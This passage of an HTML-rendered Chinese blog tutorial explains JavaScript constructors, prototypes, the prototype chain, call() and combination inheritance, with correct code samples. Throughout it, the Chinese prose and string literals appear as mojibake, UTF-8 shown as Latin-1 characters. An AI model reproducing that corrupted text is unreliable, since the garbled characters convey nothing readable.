å‡½æ•°</strong>çš„ç‰¹æ®Šå‡½æ•°æ¥å®šä¹‰å¯¹è±¡å’Œä»–ä»¬çš„ç‰¹å¾ã€‚</p><p>åˆ›å»ºå¯¹è±¡å¯é€šè¿‡ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š</p><p>1.å¯¹è±¡å­—é¢é‡ <code>var obj1 = &#123;&#125;</code></p><p>2.new Object() <code>var obj2 = new Object()</code></p><p>3.åˆ©ç”¨æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Star</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.sing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æˆ‘ä¼šå”±æ­Œ&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="keyword">var</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;å¼ å­¦å‹&#x27;</span>, <span class="number">19</span>);</span><br><span class="line">ldh.sing();</span><br><span class="line">zxy.sing();</span><br></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h2><p><strong>æ„é€ å‡½æ•°</strong>æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œä¸»è¦ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡ï¼Œå³ä¸ºå¯¹è±¡æˆå‘˜å˜é‡èµ‹åˆå§‹å€¼ï¼Œå®ƒæ€»ä¸ new ä¸€èµ·ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥æŠŠå¯¹è±¡ä¸­ä¸€äº›å…¬å…±çš„å±æ€§å’Œæ–¹æ³•æŠ½å–å‡ºæ¥ï¼Œç„¶åå°è£…åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢ã€‚</p><p>åœ¨ JS ä¸­ï¼Œä½¿ç”¨æ„é€ å‡½æ•°æ—¶è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ol><li>æ„é€ å‡½æ•°ç”¨äºåˆ›å»ºæŸä¸€ç±»å¯¹è±¡ï¼Œå…¶é¦–å­—æ¯è¦å¤§å†™</li><li>æ„é€ å‡½æ•°è¦å’Œ new ä¸€èµ·ä½¿ç”¨æ‰æœ‰æ„ä¹‰ï¼šæ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚new Array()ï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„å¯¹è±¡</li></ol><p><strong>new åœ¨æ‰§è¡Œæ—¶ä¼šåšå››ä»¶äº‹æƒ…</strong>ï¼š</p><ol><li>åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡ã€‚</li><li>è®© this æŒ‡å‘è¿™ä¸ªæ–°çš„å¯¹è±¡ã€‚</li><li>æ‰§è¡Œæ„é€ å‡½æ•°é‡Œé¢çš„ä»£ç ï¼Œç»™è¿™ä¸ªæ–°å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚</li><li>è¿”å›è¿™ä¸ªæ–°å¯¹è±¡ï¼ˆæ‰€ä»¥æ„é€ å‡½æ•°é‡Œé¢<strong>ä¸éœ€è¦ return</strong> ï¼‰ã€‚</li></ol><p>JavaScript çš„æ„é€ å‡½æ•°ä¸­å¯ä»¥æ·»åŠ ä¸€äº›æˆå‘˜ï¼Œå¯ä»¥åœ¨æ„é€ å‡½æ•°æœ¬èº«ä¸Šæ·»åŠ ï¼Œä¹Ÿå¯ä»¥åœ¨æ„é€ å‡½æ•°å†…éƒ¨çš„ this ä¸Šæ·»åŠ ã€‚é€šè¿‡è¿™ä¸¤ç§æ–¹å¼æ·»åŠ çš„æˆå‘˜ï¼Œå°±åˆ†åˆ«ç§°ä¸º<strong>é™æ€æˆå‘˜</strong>å’Œ<strong>å®ä¾‹æˆå‘˜</strong>ã€‚</p><ol><li><p>é™æ€æˆå‘˜ï¼šåœ¨æ„é€ å‡½æ•°æœ¬ä¸Šæ·»åŠ çš„æˆå‘˜ç§°ä¸ºé™æ€æˆå‘˜ï¼Œåªèƒ½ç”±<strong>æ„é€ å‡½æ•°æœ¬èº«</strong>æ¥è®¿é—®</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. é™æ€æˆå‘˜ åœ¨æ„é€ å‡½æ•°æœ¬èº«ä¸Šæ·»åŠ çš„æˆå‘˜  sex å°±æ˜¯é™æ€æˆå‘˜</span></span><br><span class="line">Star.sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line"><span class="comment">// é™æ€æˆå‘˜åªèƒ½é€šè¿‡æ„é€ å‡½æ•°æ¥è®¿é—®</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.sex); <span class="comment">//ç”·</span></span><br><span class="line"><span class="built_in">console</span>.log(ldh.sex); <span class="comment">// undefined ä¸èƒ½é€šè¿‡å¯¹è±¡æ¥è®¿é—®</span></span><br></pre></td></tr></table></figure></li><li><p>å®ä¾‹æˆå‘˜ï¼šåœ¨æ„é€ å‡½æ•°å†…éƒ¨åˆ›å»ºçš„å¯¹è±¡æˆå‘˜ç§°ä¸ºå®ä¾‹æˆå‘˜ï¼Œåªèƒ½ç”±<strong>å®ä¾‹åŒ–çš„å¯¹è±¡</strong>æ¥è®¿é—®</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.å®ä¾‹æˆå‘˜å°±æ˜¯æ„é€ å‡½æ•°å†…éƒ¨é€šè¿‡thisæ·»åŠ çš„æˆå‘˜ uname age sing å°±æ˜¯å®ä¾‹æˆå‘˜</span></span><br><span class="line"><span class="comment">// å®ä¾‹æˆå‘˜åªèƒ½é€šè¿‡å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®</span></span><br><span class="line"><span class="built_in">console</span>.log(ldh.uname); <span class="comment">// åˆ˜å¾·å</span></span><br><span class="line">ldh.sing(); <span class="comment">// æˆ‘ä¼šå”±æ­Œ</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.uname); <span class="comment">// undefined ä¸å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°æ¥è®¿é—®å®ä¾‹æˆå‘˜</span></span><br></pre></td></tr></table></figure></li></ol><p>ä½†æ˜¯æ„é€ å‡½æ•°å­˜åœ¨æµªè´¹å†…å­˜çš„é—®é¢˜ï¼š</p><p><img src="https://i.loli.net/2021/06/07/52ZDcTCJgspBIvO.jpg" alt="Snipaste_2021-06-07_09-30-44.jpg"></p><h2 id="æ„é€ å‡½æ•°åŸå‹å¯¹è±¡-prototype"><a href="#æ„é€ å‡½æ•°åŸå‹å¯¹è±¡-prototype" class="headerlink" title="æ„é€ å‡½æ•°åŸå‹å¯¹è±¡ prototype"></a>æ„é€ å‡½æ•°åŸå‹å¯¹è±¡ prototype</h2><p>æ„é€ å‡½æ•°é€šè¿‡åŸå‹åˆ†é…çš„å‡½æ•°æ˜¯æ‰€æœ‰å¯¹è±¡æ‰€<strong>å…±äº«çš„</strong></p><p>JavaScriptè§„å®šï¼Œ<strong>æ¯ä¸ªæ„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§</strong>ï¼ŒæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼Œæ³¨æ„è¿™ä¸ªprototypeï¼ˆåŸå‹ï¼‰å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œéƒ½ä¼šè¢«æ„é€ å‡½æ•°æ‰€æ‹¥æœ‰</p><p>å› æ­¤ï¼Œæˆ‘ä»¬æŠŠé‚£äº›<strong>ä¸å˜çš„æ–¹æ³•ï¼Œç›´æ¥å®šä¹‰åœ¨prototypeå¯¹è±¡</strong>ä¸Šï¼Œè¿™æ ·æ‰€æœ‰å¯¹è±¡çš„å®ä¾‹å°±å¯ä»¥<strong>å…±äº«è¿™ä¸ªæ–¹æ³•</strong></p><!--ä¸€èˆ¬æƒ…å†µä¸‹,æˆ‘ä»¬çš„å…¬å…±å±æ€§å®šä¹‰åˆ°æ„é€ å‡½æ•°é‡Œé¢, å…¬å…±çš„æ–¹æ³•æˆ‘ä»¬æ”¾åˆ°åŸå‹å¯¹è±¡èº«ä¸Š--><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Star.prototype.sing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;æˆ‘ä¼šå”±æ­Œ&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¯¹è±¡åŸå‹-proto"><a href="#å¯¹è±¡åŸå‹-proto" class="headerlink" title="å¯¹è±¡åŸå‹__proto__"></a>å¯¹è±¡åŸå‹<code>__proto__</code></h2><p><strong>å¯¹è±¡éƒ½ä¼šæœ‰ä¸€ä¸ªå±æ€§</strong> <code>__proto__</code> æŒ‡å‘æ„é€ å‡½æ•°çš„prototypeåŸå‹å¯¹è±¡ï¼Œä¹‹æ‰€ä»¥æˆ‘ä»¬å¯¹è±¡å¯ä»¥ä½¿ç”¨æ„é€ å‡½æ•°prototypeåŸå‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼Œå°±æ˜¯å› ä¸º <code>__proto__</code> çš„å­˜åœ¨</p><p><code>__proto__</code>å¯¹è±¡åŸå‹å’ŒåŸå‹å¯¹è±¡ prototype æ˜¯ç­‰ä»·çš„(<code>ldh.__proto__ === Star.prototype</code>)</p><p>æ–¹æ³•çš„æŸ¥æ‰¾è§„åˆ™: é¦–å…ˆå…ˆçœ‹ldh å¯¹è±¡èº«ä¸Šæ˜¯å¦æœ‰ sing æ–¹æ³•,å¦‚æœæœ‰å°±æ‰§è¡Œè¿™ä¸ªå¯¹è±¡ä¸Šçš„singã€‚å¦‚æœæœ‰sing è¿™ä¸ªæ–¹æ³•,å› ä¸ºæœ‰<code>__proto__ </code>çš„å­˜åœ¨,å°±å»æ„é€ å‡½æ•°åŸå‹å¯¹è±¡prototypeèº«ä¸Šå»æŸ¥æ‰¾singè¿™ä¸ªæ–¹æ³•ã€‚</p><h2 id="constructoræ„é€ å‡½æ•°"><a href="#constructoræ„é€ å‡½æ•°" class="headerlink" title="constructoræ„é€ å‡½æ•°"></a>constructoræ„é€ å‡½æ•°</h2><p>å¯¹è±¡åŸå‹ï¼ˆ <code>__proto__</code>ï¼‰å’Œæ„é€ å‡½æ•°ï¼ˆprototypeï¼‰åŸå‹å¯¹è±¡é‡Œé¢éƒ½æœ‰ä¸€ä¸ªå±æ€§ constructor å±æ€§ ï¼Œconstructor æˆ‘ä»¬ç§°ä¸ºæ„é€ å‡½æ•°ï¼Œå› ä¸ºå®ƒæŒ‡å›æ„é€ å‡½æ•°æœ¬èº«ã€‚</p><p>constructor ä¸»è¦ç”¨äºè®°å½•è¯¥å¯¹è±¡å¼•ç”¨äºå“ªä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒå¯ä»¥è®©åŸå‹å¯¹è±¡é‡æ–°æŒ‡å‘åŸæ¥çš„æ„é€ å‡½æ•°ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯¹è±¡çš„æ–¹æ³•éƒ½åœ¨æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸­è®¾ç½®ã€‚å¦‚æœæœ‰å¤šä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç»™åŸå‹å¯¹è±¡é‡‡å–<strong>å¯¹è±¡å½¢å¼èµ‹å€¼</strong>ï¼Œä½†æ˜¯è¿™æ ·å°±ä¼š<strong>è¦†ç›–</strong>æ„é€ å‡½æ•°åŸå‹å¯¹è±¡åŸæ¥çš„å†…å®¹ï¼Œè¿™æ ·ä¿®æ”¹åçš„åŸå‹å¯¹è±¡ constructor å°±<strong>ä¸å†æŒ‡å‘å½“å‰æ„é€ å‡½æ•°</strong>äº†ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¿®æ”¹åçš„åŸå‹å¯¹è±¡ä¸­ï¼Œæ·»åŠ ä¸€ä¸ª constructor æŒ‡å‘åŸæ¥çš„æ„é€ å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¾ˆå¤šæƒ…å†µä¸‹,æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨çš„åˆ©ç”¨constructor è¿™ä¸ªå±æ€§æŒ‡å› åŸæ¥çš„æ„é€ å‡½æ•° </span></span><br><span class="line"><span class="comment">// Star.prototype.sing = function() &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;æˆ‘ä¼šå”±æ­Œ&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// Star.prototype.movie = function() &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;æˆ‘ä¼šæ¼”ç”µå½±&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">Star.prototype = &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†åŸæ¥çš„åŸå‹å¯¹è±¡,ç»™åŸå‹å¯¹è±¡èµ‹å€¼çš„æ˜¯ä¸€ä¸ªå¯¹è±¡,åˆ™å¿…é¡»æ‰‹åŠ¨çš„åˆ©ç”¨constructoræŒ‡å›åŸæ¥çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="attr">constructor</span>: Star,</span><br><span class="line">    <span class="attr">sing</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æˆ‘ä¼šå”±æ­Œ&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">movie</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æˆ‘ä¼šæ¼”ç”µå½±&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°ã€å®ä¾‹ã€åŸå‹å¯¹è±¡ä¸‰è€…ä¹‹é—´çš„å…³ç³»"><a href="#æ„é€ å‡½æ•°ã€å®ä¾‹ã€åŸå‹å¯¹è±¡ä¸‰è€…ä¹‹é—´çš„å…³ç³»" class="headerlink" title="æ„é€ å‡½æ•°ã€å®ä¾‹ã€åŸå‹å¯¹è±¡ä¸‰è€…ä¹‹é—´çš„å…³ç³»"></a><strong>æ„é€ å‡½æ•°ã€å®ä¾‹ã€åŸå‹å¯¹è±¡ä¸‰è€…ä¹‹é—´çš„å…³ç³»</strong></h2><p><img src="https://i.loli.net/2021/06/07/4MQYaFsWUuBK1hf.jpg" alt="Snipaste_2021-06-07_09-46-34.jpg"></p><h2 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(Star.prototype);<span class="comment">//Object</span></span><br><span class="line">                            <span class="comment">// sing: Æ’ ()</span></span><br><span class="line">                            <span class="comment">// constructor: Æ’ Star(uname, age)</span></span><br><span class="line">                            <span class="comment">// __proto__: Object</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.prototype.__proto__ === <span class="built_in">Object</span>.prototype);<span class="comment">//true</span></span><br><span class="line"><span class="comment">// 2.æˆ‘ä»¬StaråŸå‹å¯¹è±¡é‡Œé¢çš„__proto__åŸå‹æŒ‡å‘çš„æ˜¯ Object.prototype</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.__proto__);<span class="comment">//null</span></span><br><span class="line"><span class="comment">// 3. æˆ‘ä»¬Object.prototypeåŸå‹å¯¹è±¡é‡Œé¢çš„__proto__åŸå‹  æŒ‡å‘ä¸º null</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/XdFVuiIo1hE6e4J.jpg" alt="Snipaste_2021-06-07_09-49-53.jpg"></p><h2 id="JavaScript-çš„æˆå‘˜æŸ¥æ‰¾æœºåˆ¶-è§„åˆ™"><a href="#JavaScript-çš„æˆå‘˜æŸ¥æ‰¾æœºåˆ¶-è§„åˆ™" class="headerlink" title="JavaScript çš„æˆå‘˜æŸ¥æ‰¾æœºåˆ¶(è§„åˆ™)"></a><strong>JavaScript</strong> <strong>çš„æˆå‘˜æŸ¥æ‰¾æœºåˆ¶</strong>(è§„åˆ™)</h2><ol><li>å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ï¼ˆåŒ…æ‹¬æ–¹æ³•ï¼‰æ—¶ï¼Œ<strong>é¦–å…ˆ</strong>æŸ¥æ‰¾è¿™ä¸ªå¯¹è±¡è‡ªèº«æœ‰æ²¡æœ‰è¯¥å±æ€§ã€‚</li><li>å¦‚æœæ²¡æœ‰å°±æŸ¥æ‰¾å®ƒçš„åŸå‹ï¼ˆä¹Ÿå°±æ˜¯ __proto__æŒ‡å‘çš„ prototype åŸå‹å¯¹è±¡ï¼‰ã€‚</li><li>å¦‚æœè¿˜æ²¡æœ‰å°±æŸ¥æ‰¾åŸå‹å¯¹è±¡çš„åŸå‹ï¼ˆObjectçš„åŸå‹å¯¹è±¡ï¼‰ã€‚</li><li>ä¾æ­¤ç±»æ¨ä¸€ç›´æ‰¾åˆ° Object ä¸ºæ­¢ï¼ˆnullï¼‰ã€‚</li><li><code>__proto__</code>å¯¹è±¡åŸå‹çš„æ„ä¹‰å°±åœ¨äºä¸ºå¯¹è±¡æˆå‘˜æŸ¥æ‰¾æœºåˆ¶æä¾›ä¸€ä¸ªæ–¹å‘ï¼Œæˆ–è€…è¯´ä¸€æ¡è·¯çº¿ã€‚</li></ol><h2 id="åŸå‹å¯¹è±¡thisæŒ‡å‘"><a href="#åŸå‹å¯¹è±¡thisæŒ‡å‘" class="headerlink" title="åŸå‹å¯¹è±¡thisæŒ‡å‘"></a><strong>åŸå‹å¯¹è±¡</strong>thisæŒ‡å‘</h2><p>æ„é€ å‡½æ•°ä¸­çš„this æŒ‡å‘æˆ‘ä»¬å®ä¾‹å¯¹è±¡.</p><p><strong>åŸå‹å¯¹è±¡</strong>é‡Œé¢æ”¾çš„æ˜¯æ–¹æ³•, è¿™ä¸ªæ–¹æ³•é‡Œé¢çš„<strong>this æŒ‡å‘</strong>çš„æ˜¯ è¿™ä¸ªæ–¹æ³•çš„<strong>è°ƒç”¨è€…</strong>, ä¹Ÿå°±æ˜¯è¿™ä¸ª<strong>å®ä¾‹å¯¹è±¡.</strong></p><h2 id="æ‰©å±•å†…ç½®å¯¹è±¡"><a href="#æ‰©å±•å†…ç½®å¯¹è±¡" class="headerlink" title="æ‰©å±•å†…ç½®å¯¹è±¡"></a><strong>æ‰©å±•</strong>å†…ç½®å¯¹è±¡</h2><p>å¯ä»¥é€šè¿‡åŸå‹å¯¹è±¡ï¼Œå¯¹åŸæ¥çš„å†…ç½®å¯¹è±¡è¿›è¡Œæ‰©å±•è‡ªå®šä¹‰çš„æ–¹æ³•ã€‚æ¯”å¦‚ç»™æ•°ç»„å¢åŠ è‡ªå®šä¹‰æ±‚å¶æ•°å’Œçš„åŠŸèƒ½ã€‚</p><blockquote><p>æ³¨æ„ï¼šæ•°ç»„å’Œå­—ç¬¦ä¸²å†…ç½®å¯¹è±¡<strong>ä¸èƒ½ç»™åŸå‹å¯¹è±¡è¦†ç›–æ“ä½œ</strong> Array.prototype = {} ï¼Œåªèƒ½æ˜¯ Array.prototype.xxx = function(){} çš„æ–¹å¼ã€‚</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.sum = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">this</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.sum()); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype); <span class="comment">// èƒ½æ‰¾åˆ°sumæ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1.sum()); <span class="comment">// 66</span></span><br></pre></td></tr></table></figure><hr><h1 id="ç»§æ‰¿-1"><a href="#ç»§æ‰¿-1" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h1><p>ES6ä¹‹å‰å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬æä¾› extends ç»§æ‰¿ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>æ„é€ å‡½æ•°+åŸå‹å¯¹è±¡</strong>æ¨¡æ‹Ÿå®ç°ç»§æ‰¿ï¼Œè¢«ç§°ä¸º<strong>ç»„åˆç»§æ‰¿</strong>ã€‚</p><h2 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h2><p>è°ƒç”¨è¿™ä¸ªå‡½æ•°, å¹¶ä¸”ä¿®æ”¹å‡½æ•°è¿è¡Œæ—¶çš„ this æŒ‡å‘  </p><p><code>fun.call(thisArg, arg1, arg2, ...) </code></p><ul><li>lthisArg ï¼šå½“å‰è°ƒç”¨å‡½æ•° this çš„æŒ‡å‘å¯¹è±¡</li><li>larg1ï¼Œarg2ï¼šä¼ é€’çš„å…¶ä»–å‚æ•°</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(x + y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// call() å¯ä»¥æ”¹å˜è¿™ä¸ªå‡½æ•°çš„thisæŒ‡å‘ æ­¤æ—¶è¿™ä¸ªå‡½æ•°çš„this å°±æŒ‡å‘äº†oè¿™ä¸ªå¯¹è±¡</span></span><br><span class="line">fn.call(o, <span class="number">1</span>, <span class="number">2</span>);   <span class="comment">//&#123;name:&#x27;andy&#x27;&#125;</span></span><br><span class="line">                    <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿çˆ¶ç±»å‹å±æ€§"><a href="#å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿çˆ¶ç±»å‹å±æ€§" class="headerlink" title="å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿çˆ¶ç±»å‹å±æ€§"></a><strong>å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿çˆ¶</strong>ç±»å‹å±æ€§</h2><p>æ ¸å¿ƒåŸç†ï¼š é€šè¿‡ call() æŠŠçˆ¶ç±»å‹çš„ this æŒ‡å‘å­ç±»å‹çš„ this ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å­ç±»å‹ç»§æ‰¿çˆ¶ç±»å‹çš„å±æ€§ã€‚  </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å€Ÿç”¨çˆ¶æ„é€ å‡½æ•°ç»§æ‰¿å±æ€§</span></span><br><span class="line"><span class="comment">// 1. çˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this æŒ‡å‘çˆ¶æ„é€ å‡½æ•°çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 .å­æ„é€ å‡½æ•° </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, score</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this æŒ‡å‘å­æ„é€ å‡½æ•°çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age);</span><br><span class="line">    <span class="built_in">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son); <span class="comment">// SonÂ &#123;uname: &quot;åˆ˜å¾·å&quot;, age: 18, score: 100&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å€Ÿç”¨åŸå‹å¯¹è±¡ç»§æ‰¿çˆ¶ç±»å‹æ–¹æ³•"><a href="#å€Ÿç”¨åŸå‹å¯¹è±¡ç»§æ‰¿çˆ¶ç±»å‹æ–¹æ³•" class="headerlink" title="å€Ÿç”¨åŸå‹å¯¹è±¡ç»§æ‰¿çˆ¶ç±»å‹æ–¹æ³•"></a><strong>å€Ÿç”¨åŸå‹å¯¹è±¡ç»§æ‰¿</strong>çˆ¶<strong>ç±»å‹æ–¹æ³•</strong></h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯¹è±¡çš„æ–¹æ³•éƒ½åœ¨æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸­è®¾ç½®ï¼Œé€šè¿‡æ„é€ å‡½æ•°æ— æ³•ç»§æ‰¿çˆ¶ç±»æ–¹æ³•ã€‚ </p><p> æ ¸å¿ƒåŸç†ï¼š </p><ol><li>å°†å­ç±»æ‰€å…±äº«çš„æ–¹æ³•æå–å‡ºæ¥ï¼Œè®©å­ç±»çš„ prototype åŸå‹å¯¹è±¡ = new çˆ¶ç±»() </li><li>æœ¬è´¨ï¼šå­ç±»åŸå‹å¯¹è±¡ç­‰äºæ˜¯å®ä¾‹åŒ–çˆ¶ç±»ï¼Œå› ä¸ºçˆ¶ç±»å®ä¾‹åŒ–ä¹‹åå¦å¤–å¼€è¾Ÿç©ºé—´ï¼Œå°±ä¸ä¼šå½±å“åŸæ¥çˆ¶ç±»åŸå‹å¯¹è±¡</li><li>å°†å­ç±»çš„ constructor ä»æ–°æŒ‡å‘å­ç±»çš„æ„é€ å‡½æ•°</li></ol><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. çˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this æŒ‡å‘çˆ¶æ„é€ å‡½æ•°çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">Father.prototype.money = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">100000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 2 .å­æ„é€ å‡½æ•° </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, score</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this æŒ‡å‘å­æ„é€ å‡½æ•°çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age);</span><br><span class="line">    <span class="built_in">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Son.prototype = Father.prototype;  è¿™æ ·ç›´æ¥èµ‹å€¼ä¼šæœ‰é—®é¢˜,å¦‚æœä¿®æ”¹äº†å­åŸå‹å¯¹è±¡,çˆ¶åŸå‹å¯¹è±¡ä¹Ÿä¼šè·Ÿç€ä¸€èµ·å˜åŒ–</span></span><br><span class="line"><span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªFatherå¯¹è±¡</span></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="comment">// 